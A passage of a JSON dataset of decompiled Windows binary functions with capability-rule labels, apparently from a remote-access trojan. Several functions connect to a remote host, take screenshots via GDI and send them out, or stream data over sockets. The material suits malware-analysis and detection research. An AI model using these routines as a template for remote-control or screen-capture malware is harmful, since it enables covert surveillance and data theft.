        "decompiled_code": "\nvoid __cdecl fcn.00473f30(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    uchar *in_EDX;\n    \n    fcn.00473ec8();\n    *(in_EAX + 0x16b0) = 8;\n    if (arg_8h != 0) {\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = in_ECX;\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = in_ECX >> 8;\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = ~in_ECX;\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = ~in_ECX >> 8;\n    }\n    while (in_ECX != 0) {\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *in_EDX;\n        in_EDX = in_EDX + 1;\n        in_ECX = in_ECX + -1;\n    }\n    return;\n}\n",
        "token_count": 436
    },
    "00474094": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00474094(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0;\n    *0x4981ac = sub.kernel32.dll_LoadLibraryA(0x474140);\n    if (*0x4981ac != 0) {\n        *0x498198 = sub.kernel32.dll_GetProcAddress_1(*0x4981ac, 0x47414c);\n        if (*0x498198 != 0) {\n            *0x49819c = sub.kernel32.dll_GetProcAddress_1(*0x4981ac, 0x47415c);\n            if (*0x49819c != 0) {\n                *0x4981a0 = sub.kernel32.dll_GetProcAddress_1(*0x4981ac, 0x47416c);\n                if (*0x4981a0 != 0) {\n                    *0x4981a4 = sub.kernel32.dll_GetProcAddress_1(*0x4981ac, 0x474180);\n                    if (*0x4981a4 != 0) {\n                        *0x4981a8 = sub.kernel32.dll_GetProcAddress_1(*0x4981ac, 0x474194);\n                        if (*0x4981a8 != 0) {\n                            uVar1 = 1;\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 304
    },
    "004741b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004741b0(void)\n\n{\n    if (*0x4981ac != 0) {\n        sub.kernel32.dll_FreeLibrary_1(*0x4981ac);\n    }\n    return;\n}\n",
        "token_count": 47
    },
    "0047de7c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047de7c(void)\n\n{\n    uchar *puVar1;\n    uint *in_FS_OFFSET;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x47dec6;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x4981b0 = *0x4981b0 + 1;\n    if (*0x4981b0 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (**0x4922b8 == 0) {\n            sub.wsock32.dll_WSACleanup();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        if (**0x4922c4 != 0) {\n            fcn.0040f934();\n        }\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 221
    },
    "0047e2a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047e2a4(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uchar uVar5;\n    int64_t iVar6;\n    ulong uVar7;\n    uint uVar8;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x47e4fb;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (param_2 != NULL) {\n        puStack40 = 0x47e2d5;\n        iVar6 = (***param_2)();\n        if (iVar6 >> 0x20 == 0) {\n            if (iVar6 != 0) {\ncode_r0x0047e2ea:\n                puStack40 = 0x47e2f5;\n                fcn.004055c8();\n                puStack40 = 0x47e307;\n                fcn.00405a84();\n                puStack40 = 0x47e313;\n                puVar1 = fcn.00404620();\n                uVar5 = 1;\n                uStack44 = 0x47e4de;\n                uStack48 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd0;\n                puStack40 = &stack0xfffffffc;\n                fcn.0041b724(0, 0);\n                fcn.0041be34();\n                fcn.0046e7ac();\n                uVar8 = 0;\n                fcn.0041b724(0, 0);\n                fcn.00405974();\n                if (uVar5) {\n                    uVar7 = (***puVar1)();\n                    uVar8 = uVar7;\n                    iVar2 = fcn.00465968(uVar7);\n                    **0x492784 = iVar2;\n                    uVar5 = **0x492784 == 0;\n                    if (!uVar5) {\n                        pcVar3 = fcn.00465d54();\n                        **0x4925d4 = pcVar3;\n                        uVar5 = pcVar3 == NULL;\n                        if (!uVar5) {\n                            uVar4 = fcn.004059dc(**0x4925e8);\n                            (***0x4925d4)(*(in_EAX + 0x48), **0x49248c, uVar4);\n                        }\n                    }\n                }\n                fcn.00405974();\n                if (uVar5) {\n                    uVar7 = (***puVar1)();\n                    uVar8 = uVar7;\n                    iVar2 = fcn.00465968(uVar7);\n                    **0x492784 = iVar2;\n                    if (**0x492784 != 0) {\n                        pcVar3 = fcn.00465d54();\n                        **0x4926ac = pcVar3;\n                        uVar4 = fcn.00465d54();\n                        **0x49273c = uVar4;\n                        uVar4 = fcn.00465d54();\n                        **0x49270c = uVar4;\n                        uVar4 = fcn.00465d54();\n                        **0x492758 = uVar4;\n                        uVar4 = fcn.00465d54();\n                        **0x49242c = uVar4;\n                        if (**0x4926ac != NULL) {\n                            uVar4 = fcn.004059dc();\n                            (***0x4926ac)(**0x4925a8, uVar4);\n                        }\n                    }\n                }\n                *in_FS_OFFSET = uVar8;\n                uVar8 = 0x47e4e5;\n                if (puVar1 != NULL) {\n                    fcn.0040f934(0x47e4e5);\n                }\n                if (param_2 != NULL) {\n                    fcn.0040f934(uVar8);\n                }\n                return;\n            }\n        }\n        else if (0xffffffff < iVar6) goto code_r0x0047e2ea;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x47e502;\n    uStack32 = 0x47e4fa;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 1027
    },
    "0047e5b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_11h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0047e5b0(void)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *unaff_ESI;\n    uint32_t unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    int32_t iStackY160;\n    uint uStackY156;\n    int32_t iStack64;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uchar auStack24 [3];\n    int32_t *var_11h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    iVar2 = 0x433;\n    do {\n        var_4h = 0;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    uStack32 = 0x47ea00;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    bVar1 = false;\n    uVar3 = 1;\n    _auStack24 = unaff_EDI;\n    unique0x10000308 = unaff_ESI;\n    var_ch = in_EAX;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar3) {\n        _auStack24 = CONCAT13(1, auStack24);\n    }\n    else {\n        _auStack24 = _auStack24 & 0xffffff;\n    }\n    var_4h = sub.wsock32.dll_socket();\n    if (var_4h != -1) {\n        sub.wsock32.dll_htons();\n        iVar2 = sub.wsock32.dll_inet_addr();\n        if (iVar2 == -1) {\n            iStack64 = **0x4925e8;\n            iVar2 = sub.wsock32.dll_gethostbyname();\n            if (iVar2 == 0) goto code_r0x0047e99f;\n        }\n        sub.wsock32.dll_connect();\n        iVar2 = sub.wsock32.dll_recv();\n        if (iVar2 != -1) {\n            fcn.00409d60();\n            fcn.004058e0();\n            fcn.00474dbc();\n            iVar2 = sub.wsock32.dll_recv();\n            if (iVar2 != -1) {\n                fcn.00403af4();\n                sub.wsock32.dll_recv();\n                fcn.00405e3c();\n                fcn.00409bc0();\n                fcn.004057d4();\n                iVar2 = fcn.00409ecc();\n                *(var_ch + 0x50) = iVar2;\n                *(var_ch + 0x54) = iVar2 >> 0x1f;\n                uStackY156 = 0x47e78c;\n                fcn.0047e590(&stack0xfffffffc);\n                if (var_11h == '\\0') {\n                    uStackY156 = 0x47e819;\n                    iStackY160 = *in_FS_OFFSET;\n                    *in_FS_OFFSET = &stack0xffffff60;\n                    fcn.0040a67c();\n                    fcn.00489414();\n                    fcn.00405864();\n                    fcn.00403770();\n                    **0x49268c = 1;\n                    fcn.00403e84();\n                    fcn.0040305c();\n                    bVar1 = true;\n                    *in_FS_OFFSET = iStackY160;\n                    while (*(var_ch + 0xd) == '\\0') {\n                        fcn.00403af4();\n                        iVar2 = sub.wsock32.dll_recv();\n                        uVar3 = iVar2 == 0;\n                        if (iVar2 < 1) break;\n                        fcn.00405e3c();\n                        fcn.00409bc0();\n                        fcn.004057d4();\n                        fcn.00405a44();\n                        fcn.00405974();\n                        if (uVar3) break;\n                        fcn.004038f8(0);\n                        fcn.0040305c();\n                        fcn.0047e590(&stack0xfffffffc);\n                    }\n                }\n                else {\n                    *NULL = fcn.00404620();\n                    while (*(var_ch + 0xd) == '\\0') {\n                        fcn.00403af4();\n                        iVar2 = sub.wsock32.dll_recv();\n                        if (iVar2 < 1) break;\n                        (**(*stack0xffffffec + 0x10))();\n                        fcn.0047e590(&stack0xfffffffc);\n                    }\n                }\n            }\n        }\n        if (var_11h == '\\0') {\n            if (bVar1) {\n                fcn.00403918();\n                fcn.0040305c();\n            }\n            fcn.0047df50();\n        }\n        else {\n            fcn.0047e2a4();\n        }\n        sub.wsock32.dll_shutdown();\n        iStack64 = var_4h;\n        sub.wsock32.dll_closesocket();\n        fcn.0041fe98();\n    }\ncode_r0x0047e99f:\n    *in_FS_OFFSET = iStack64;\n    fcn.00405530();\n    fcn.00405d40();\n    fcn.00405554();\n    fcn.00405d40();\n    fcn.00405554();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 1243
    },
    "0047eb5c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047eb5c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t *in_FS_OFFSET;\n    ushort uStackY8240;\n    ushort uStackY8238;\n    int32_t iStackY8236;\n    uchar auStackY8224 [3836];\n    uint uStackY4388;\n    uint uStackY4384;\n    uint uStackY4380;\n    uint uStackY4376;\n    uint uStackY4372;\n    int32_t iStack4252;\n    uint uStack4248;\n    uchar *puStack4244;\n    uchar *puStack4236;\n    uint uStack4232;\n    uint uStack4228;\n    uchar *puStack4220;\n    uint uStack4216;\n    uint uStack4212;\n    int32_t iStack4208;\n    uchar *puStack4204;\n    uint uStack4200;\n    int32_t iStack4196;\n    int32_t iStack4192;\n    uint32_t uStack4188;\n    uint uStack4184;\n    uint uStack4180;\n    uint uStack4176;\n    int32_t iStack4172;\n    uint uStack4168;\n    uchar *puStack4164;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack4164 = &stack0xfffffffc;\n    iVar2 = 2;\n    do {\n        iVar1 = iVar2;\n        iVar2 = iVar1 + -1;\n    } while (iVar1 + -1 != 0);\n    uStack4168 = 0x47ee50;\n    iStack4172 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffefb4;\n    uStack4176 = 0;\n    uStack4180 = 1;\n    uStack4184 = 2;\n    uStack4188 = 0x47eba0;\n    var_4h = iVar1;\n    var_4h = sub.wsock32.dll_socket();\n    if (var_4h != -1) {\n        uStackY8240 = 2;\n        uStack4188 = **0x49248c;\n        iStack4192 = 0x47ebc4;\n        uStackY8238 = sub.wsock32.dll_htons();\n        iStack4192 = **0x4925e8;\n        iStack4196 = 0x47ebd8;\n        iStackY8236 = sub.wsock32.dll_inet_addr();\n        if (iStackY8236 == -1) {\n            iStack4196 = **0x4925e8;\n            uStack4200 = 0x47ebf0;\n            iVar2 = sub.wsock32.dll_gethostbyname();\n            if (iVar2 == 0) goto code_r0x0047ee02;\n            iStackY8236 = ***(iVar2 + 0xc);\n        }\n        uStack4200 = 0x10;\n        puStack4204 = &stack0xffffdfd0;\n        iStack4208 = var_4h;\n        uStack4212 = 0x47ec17;\n        sub.wsock32.dll_connect();\n        uStack4212 = 0;\n        uStack4216 = 0x2000;\n        puStack4220 = &stack0xffffdfe0;\n        iStack4196 = var_4h;\n        uStack4228 = 0x47ec2e;\n        iVar2 = sub.wsock32.dll_recv();\n        if (iVar2 != -1) {\n            uStack4228 = 0x47ec43;\n            fcn.00409d60();\n            uStack4228 = 0x47ec59;\n            fcn.00405864();\n            uStack4228 = 0x47ec67;\n            fcn.00474dbc();\n            uStack4228 = 0;\n            uStack4232 = 0x2000;\n            puStack4236 = &stack0xffffdfe0;\n            iStack4196 = var_4h;\n            puStack4244 = 0x47ec7e;\n            iVar2 = sub.wsock32.dll_recv();\n            if (iVar2 != -1) {\n                puStack4244 = 0x47ec91;\n                var_8h = fcn.00404620();\n                puStack4244 = 0x47eca0;\n                piVar3 = fcn.00404620();\n                uStack4248 = 0x47edfb;\n                iStack4252 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffef64;\n                puStack4244 = &stack0xfffffffc;\n                uVar4 = sub.user32.dll_GetDC();\n                uVar5 = sub.gdi32.dll_CreateCompatibleDC();\n                sub.gdi32.dll_GetDeviceCaps();\n                sub.gdi32.dll_GetDeviceCaps();\n                uVar6 = sub.gdi32.dll_CreateCompatibleBitmap();\n                sub.gdi32.dll_SelectObject();\n                sub.gdi32.dll_GetDeviceCaps();\n                sub.gdi32.dll_GetDeviceCaps();\n                sub.gdi32.dll_BitBlt();\n                fcn.0045feec(&fcn.0047eb5c::var_8h);\n                fcn.0041b724(0, 0);\n                fcn.0046e674();\n                iVar2 = 0;\n                uStackY4372 = 0x47ed64;\n                fcn.0041b724(0, 0);\n                while( true ) {\n                    uStackY4372 = 0x47ed76;\n                    fcn.00403af4();\n                    uStackY4372 = 0x47ed89;\n                    iVar7 = (**(*piVar3 + 0xc))();\n                    if (iVar7 == 0) break;\n                    sub.wsock32.dll_send();\n                    uStackY4372 = 0x47edb9;\n                    iVar2 = var_4h;\n                    sub.wsock32.dll_recv();\n                    if ((iVar7 == 0) || (*(iVar1 + 0xd) != '\\0')) break;\n                }\n                *in_FS_OFFSET = iVar2;\n                uStackY4372 = 0x47eddd;\n                sub.gdi32.dll_SelectObject();\n                uStackY4376 = 0x47ede6;\n                uStackY4372 = uVar5;\n                sub.gdi32.dll_DeleteObject();\n                uStackY4380 = 0x47edef;\n                uStackY4376 = uVar6;\n                sub.gdi32.dll_DeleteObject();\n                uStackY4384 = 0;\n                uStackY4388 = 0x47edfa;\n                uStackY4380 = uVar4;\n                sub.user32.dll_ReleaseDC();\n                return;\n            }\n        }\n    }\ncode_r0x0047ee02:\n    if (var_8h != 0) {\n        uStack4200 = 0x47ee10;\n        fcn.0040f934();\n    }\n    if (var_ch != 0) {\n        uStack4200 = 0x47ee1e;\n        fcn.0040f934();\n    }\n    uStack4200 = 2;\n    puStack4204 = var_4h;\n    iStack4208 = 0x47ee29;\n    sub.wsock32.dll_shutdown();\n    iStack4208 = var_4h;\n    uStack4212 = 0x47ee32;\n    sub.wsock32.dll_closesocket();\n    *in_FS_OFFSET = iStack4208;\n    uStack4200 = 0x47ee57;\n    puStack4204 = 0x47ee4f;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1768
    },
    "0047eef0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047eef0(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack1180;\n    int32_t iStack1176;\n    uchar *puStack1172;\n    int32_t iStack1116;\n    int32_t iStack1092;\n    uint uStack1088;\n    uchar *puStack1084;\n    uint var_428h;\n    uint var_424h;\n    uint var_420h;\n    uint name;\n    uint var_40ch;\n    int32_t *var_ch;\n    int32_t s;\n    uint var_4h;\n    \n    puStack1084 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack1088 = 0x47f123;\n    iStack1092 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbbc;\n    puVar1 = &stack0xfffffffc;\n    if ((*(in_EAX + 0x44) == 0) && (s = sub.wsock32.dll_socket(),  puVar1 = puStack1084,  s != -1)) {\n        sub.wsock32.dll_htons();\n        iVar2 = sub.wsock32.dll_inet_addr();\n        if (iVar2 == -1) {\n            iStack1116 = **0x4925e8;\n            iVar2 = sub.wsock32.dll_gethostbyname();\n            puVar1 = puStack1084;\n            if (iVar2 == 0) goto code_r0x0047f0fd;\n        }\n        sub.wsock32.dll_connect();\n        iVar2 = sub.wsock32.dll_recv();\n        if (iVar2 != -1) {\n            fcn.00409d60();\n            fcn.00405864();\n            fcn.00474dbc();\n            iVar2 = sub.wsock32.dll_recv();\n            if (iVar2 != -1) {\n                var_ch = fcn.00404620();\n                puStack1172 = 0x47f032;\n                fcn.0041b724(0, 0);\n                iStack1176 = 0x47f0e2;\n                iStack1180 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xfffffb64;\n                puStack1172 = &stack0xfffffffc;\n                while( true ) {\n                    fcn.00403af4();\n                    iVar2 = sub.wsock32.dll_recv(s, &fcn.0047eef0::var_40ch, 0x400, 0);\n                    if (iVar2 < 1) break;\n                    (**(*var_ch + 0x10))();\n                    puStack1172 = 0x400;\n                    iStack1176 = &fcn.0047eef0::var_40ch + 1;\n                    iStack1180 = s;\n                    sub.wsock32.dll_send();\n                }\n                iVar2 = 0;\n                fcn.0041b724(0, 0);\n                fcn.0048b434();\n                fcn.00461610();\n                fcn.00474f94();\n                fcn.0040f934();\n                *in_FS_OFFSET = iVar2;\n                fcn.00404650(0x47f0e9);\n                return;\n            }\n        }\n        sub.wsock32.dll_shutdown();\n        iStack1116 = s;\n        sub.wsock32.dll_closesocket();\n        puVar1 = puStack1084;\n    }\ncode_r0x0047f0fd:\n    puStack1084 = puVar1;\n    *in_FS_OFFSET = iStack1116;\n    fcn.00405554();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 827
    },
    "0047f2cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0047f68f)\n\nvoid fcn.0047f2cc(void)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *in_FS_OFFSET;\n    int64_t iVar5;\n    uchar auStackY8220 [3608];\n    uint uStackY4612;\n    uchar *puStackY4604;\n    uint uStackY4600;\n    uint uStackY4596;\n    uint uStackY4592;\n    uint uStackY4588;\n    uint uStackY4584;\n    uint *puStack4540;\n    int32_t iStack4516;\n    uint *puStack4512;\n    uint *arg_8h;\n    uchar *puStack4472;\n    uint uStack4468;\n    uchar *puStack4464;\n    uchar *puStack4456;\n    uint uStack4452;\n    uint uStack4448;\n    uint uStack4444;\n    int32_t var_18h;\n    uint var_14h;\n    uint s;\n    int32_t len;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar3 = 2;\n    do {\n        var_8h = iVar3;\n        iVar3 = var_8h + -1;\n    } while (var_8h + -1 != 0);\n    var_4h = 0;\n    puStack4512 = 0x47f6ec;\n    iStack4516 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffee5c;\n    if ((*(var_8h + 0x48) == 0) && (puVar2 = sub.wsock32.dll_socket(),  puVar2 != 0xffffffff)) {\n        sub.wsock32.dll_htons();\n        iVar3 = sub.wsock32.dll_inet_addr();\n        if (iVar3 == -1) {\n            puStack4540 = **0x4925e8;\n            iVar3 = sub.wsock32.dll_gethostbyname();\n            if (iVar3 == 0) goto code_r0x0047f6c6;\n        }\n        sub.wsock32.dll_connect();\n        iVar3 = sub.wsock32.dll_recv();\n        if (iVar3 != -1) {\n            uVar4 = fcn.0047f760();\n            uStackY4584 = 0x47f3e8;\n            fcn.00409e4c(uVar4);\n            uStackY4584 = 0;\n            uStackY4588 = 0x47f71c;\n            uStackY4592 = 0x47f404;\n            fcn.00409d60();\n            uStackY4592 = 0;\n            uStackY4596 = 0x47f41a;\n            fcn.004058e0();\n            uStackY4596 = 0x47f428;\n            fcn.00474dbc();\n            uStackY4596 = 0;\n            uStackY4600 = 0x2000;\n            puStackY4604 = &stack0xffffdfe4;\n            uStackY4612 = 0x47f43f;\n            iVar3 = sub.wsock32.dll_recv();\n            if (iVar3 != -1) {\n                uStackY4612 = 0x47f451;\n                var_18h = (**(**(var_8h + 0x40) + 0x14))();\n                if (-1 < var_18h + -1) {\n                    while( true ) {\n                        iStack4516 = 0x47f476;\n                        (**(**(var_8h + 0x40) + 0xc))();\n                        uVar4 = fcn.0047f1ac();\n                        uStack4444 = 0x47f49b;\n                        fcn.00409e4c(uVar4);\n                        uStack4444 = 0;\n                        uStack4448 = 0x47f4b1;\n                        fcn.004058e0();\n                        uStack4448 = 0x47f4bf;\n                        fcn.00474e58();\n                        uStack4448 = 0;\n                        uStack4452 = 0x2000;\n                        puStack4456 = &stack0xffffdfe4;\n                        puStack4464 = 0x47f4d6;\n                        puStack4512 = puVar2;\n                        iVar3 = sub.wsock32.dll_recv();\n                        if (iVar3 == -1) break;\n                        puStack4464 = 0x47f4e5;\n                        cVar1 = fcn.0040a25c();\n                        if (cVar1 == '\\0') {\ncode_r0x0047f502:\n                            puStack4464 = 0x47f50f;\n                            fcn.00474e58();\n                            puStack4464 = NULL;\n                            uStack4468 = 0x2000;\n                            puStack4472 = &stack0xffffdfe4;\n                            puStack4512 = puVar2;\n                            iVar3 = sub.wsock32.dll_recv();\n                        }\n                        else {\n                            puStack4464 = 0x47f4f4;\n                            iVar5 = fcn.0047f1ac();\n                            if (iVar5 >> 0x20 == 0) {\n                                if (iVar5 == 0) goto code_r0x0047f502;\n                            }\n                            else if (iVar5 < 0x100000000) goto code_r0x0047f502;\n                            uStack4468 = 0x47f5f3;\n                            puStack4472 = *in_FS_OFFSET;\n                            *in_FS_OFFSET = &stack0xffffee88;\n                            puStack4464 = &stack0xfffffffc;\n                            fcn.00403770();\n                            **0x49268c = 0;\n                            fcn.00403e68();\n                            while( true ) {\n                                fcn.00403af4();\n                                arg_8h = &fcn.0047f2cc::len;\n                                fcn.004038d8(arg_8h);\n                                if ((len < 1) || (arg_8h = puVar2,  iVar3 = sub.wsock32.dll_send(),  iVar3 == -1))\n                                break;\n                                puStack4512 = 0x47f5ca;\n                                arg_8h = puVar2;\n                                iVar3 = sub.wsock32.dll_recv();\n                                if ((iVar3 == -1) || (len == 0)) break;\n                            }\n                            puStack4512 = 0x47f5e2;\n                            fcn.00403918();\n                            puStack4512 = 0x47f5e7;\n                            fcn.0040305c();\n                            *in_FS_OFFSET = arg_8h;\n                            fcn.00474e58();\n                            iStack4516 = 0x47f658;\n                            puStack4512 = puVar2;\n                            iVar3 = sub.wsock32.dll_recv();\n                        }\n                        if ((iVar3 == -1) || (var_18h = var_18h + -1,  var_18h == 0)) break;\n                    }\n                }\n                iStack4516 = 0x47f674;\n                fcn.00474e58();\n                iStack4516 = 0;\n                sub.wsock32.dll_recv();\n            }\n        }\n        sub.wsock32.dll_shutdown();\n        sub.wsock32.dll_closesocket();\n        fcn.0040f934();\n        fcn.0041fe98();\n        puStack4540 = puVar2;\n    }\ncode_r0x0047f6c6:\n    *in_FS_OFFSET = puStack4540;\n    fcn.00405554();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 1720
    },
    "0047f950": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.0047f950(void)\n\n{\n    bool bVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uchar uVar5;\n    uchar auStackY8212 [8100];\n    uint uStackY112;\n    uchar *puStackY104;\n    uint uStackY100;\n    uint uStackY96;\n    int32_t iStack64;\n    int32_t iStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint s;\n    \n    puStack32 = &stack0xfffffffc;\n    iVar4 = 0x431;\n    do {\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    uStack36 = 0x47fd56;\n    iStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    bVar1 = false;\n    puVar2 = &stack0xfffffffc;\n    if ((*(in_EAX + 0x48) == 0) && (iVar4 = sub.wsock32.dll_socket(),  puVar2 = puStack32,  iVar4 != -1)) {\n        sub.wsock32.dll_htons();\n        iVar3 = sub.wsock32.dll_inet_addr();\n        if (iVar3 == -1) {\n            iStack64 = **0x4925e8;\n            iVar3 = sub.wsock32.dll_gethostbyname();\n            puVar2 = puStack32;\n            if (iVar3 == 0) goto code_r0x0047fd0b;\n        }\n        sub.wsock32.dll_connect();\n        uStackY96 = 0x47fa18;\n        iVar3 = sub.wsock32.dll_recv();\n        if (iVar3 != -1) {\n            uStackY96 = 0x47fa2d;\n            fcn.00409d60();\n            uStackY96 = 0x47fa43;\n            fcn.00405864();\n            uStackY96 = 0x47fa51;\n            fcn.00474dbc();\n            uStackY96 = 0;\n            uStackY100 = 0x2000;\n            puStackY104 = &stack0xffffdfec;\n            uStackY112 = 0x47fa68;\n            iVar3 = sub.wsock32.dll_recv();\n            if (iVar3 != -1) {\n                while (*(in_EAX + 0xd) == '\\0') {\n                    fcn.00403af4();\n                    iVar3 = sub.wsock32.dll_recv();\n                    uVar5 = iVar3 == 0;\n                    if ((iVar3 < 1) && (uVar5 